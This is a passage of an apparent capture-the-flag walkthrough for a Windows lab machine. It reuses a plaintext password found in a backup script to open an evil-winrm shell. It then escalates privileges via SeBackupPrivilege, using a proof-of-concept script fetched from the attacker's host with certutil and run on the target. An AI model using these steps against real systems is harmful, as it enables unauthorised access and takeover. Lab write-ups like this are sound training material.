+* we obtained backup\_script.ps1...
+  * lets check it out
+
+```bash
+$cat Backup_script.ps1 
+
+$sourceDirectory = "C:\smb"
+$destinationDirectory = "D:\Backup"
+
+$username = "emily.oscars"
+$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
+$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
+$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
+$backupFileName = "smb_backup_$dateStamp.zip"
+$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
+Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
+Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
+```
+
+<figure><img src=".gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+
+
+
+#### Lateral Movement 2
+
+* lets try to get a shell with evil-winrm&#x20;
+
+```bash
+evil-winrm -i 10.10.11.35  -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
+```
+
+* cool, got it done
+
+#### Finding the flag
+
+```powershell
+*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> cd ..
+*Evil-WinRM* PS C:\Users\emily.oscars.CICADA> dir
+
+
+    Directory: C:\Users\emily.oscars.CICADA
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-r---         8/28/2024  10:32 AM                Desktop
+d-r---         8/22/2024   2:22 PM                Documents
+d-r---          5/8/2021   1:20 AM                Downloads
+d-r---          5/8/2021   1:20 AM                Favorites
+d-r---          5/8/2021   1:20 AM                Links
+d-r---          5/8/2021   1:20 AM                Music
+d-r---          5/8/2021   1:20 AM                Pictures
+d-----          5/8/2021   1:20 AM                Saved Games
+d-r---          5/8/2021   1:20 AM                Videos
+
+
+*Evil-WinRM* PS C:\Users\emily.oscars.CICADA> cd Desktop
+*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> dir
+
+
+    Directory: C:\Users\emily.oscars.CICADA\Desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-ar---        11/25/2024   3:01 AM             34 user.txt
+
+
+*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> type user.txt
+*****USER_FLAG*****
+```
+
+* just move to Desktop dir and type the user.txt file...
+
+<figure><img src=".gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+
+#### Checking the goal subfolder where we wanna get inside
+
+* C:\Users\Administrator\Desktop\root.txt
+
+<figure><img src=".gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+
+
+
+#### PrivEsc
+
+* whoami /priv
+  * SeBackupPrivilege
+    * well-known vuln to be privesced...
+      * [https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens)
+      * POC: [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1?source=post\_page-----83ddcc0db5c7--------------------------------](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1?source=post_page-----83ddcc0db5c7--------------------------------)
+* nano esc.ps1 (from POC GitHub)
+* python3 -m http.server 9000
+* (Evil-WinRM) certutil -urlcache -f http://10.10.14.60:9000/esc.ps1 esc.ps1
+*
+
+    <figure><img src=".gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src=".gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+
+* .  ./esc.ps1
+* Acl-FullControl -user cicada\emily.oscars -path C:\users\administrator\desktop
+
+<figure><img src=".gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+
+* now we can access admin folders...
+  * cd C:\Users\Administrator\Desktop
+  * dir
+  * type root.txt
+    * \***ROOT\_FLAG**\*
+
+<figure><img src=".gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+
